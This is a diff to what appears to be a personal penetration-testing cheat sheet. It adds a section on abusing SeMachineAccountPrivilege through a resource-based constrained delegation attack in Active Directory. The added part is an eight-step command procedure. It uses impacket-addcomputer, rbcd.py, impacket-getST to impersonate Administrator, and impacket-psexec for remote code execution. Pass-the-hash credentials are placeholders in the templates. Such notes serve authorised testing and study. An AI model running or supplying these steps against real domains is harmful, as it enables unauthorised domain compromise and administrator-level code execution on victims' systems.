@@ -204,6 +204,20 @@
 ### SeManageVolume 
 - https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 
+### SeMachineAccountPrivilege
+- Maybe can use RBCD attack
+- Req. AD Domain
+-  https://github.com/tothi/rbcd-attack
+#### RBCD
+1. [Kali] Add the rogue computer ``` impacket-addcomputer {domain name}/{username} -dc-ip {dc ip} -hashes :{ntlm hash} -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!' ```
+2. [Victim Window] Check if adcomputer is added in ``` get-adcomputer attack ```
+3. [Kali] RBCD attack: ``` sudo python3 ~/Downloads/WindowUsefulTools/rbcd-attack/rbcd.py -dc-ip {dc-ip} -t {NetBIOS computer name} -f 'ATTACK' -hashes :{ntlm hash} {domain name}\\{username} ```
+4. [Victim Window] Verify if added correctly ``` Get-adcomputer {NetBIOS computer name} -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds- ```
+5. [Kali] generate Administrator service ticket ``` impacket-getST -spn {FQDN} {domain name}/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip {dc-ip} ```
+6. [Kali] ``` export KRB5CCNAME=./Administrator.ccache ``` (CAREFUL About the ccache name genearted in step 5)
+7. [Kali] Register domain name in /etc/hosts
+8. [Kali] RCE ``` sudo impacket-psexec -k -no-pass {FQDN} -dc-ip {dc-ip}```
+
 # Struggling point
 - may need one user jump to another and then jump to another and still not priviledged
 
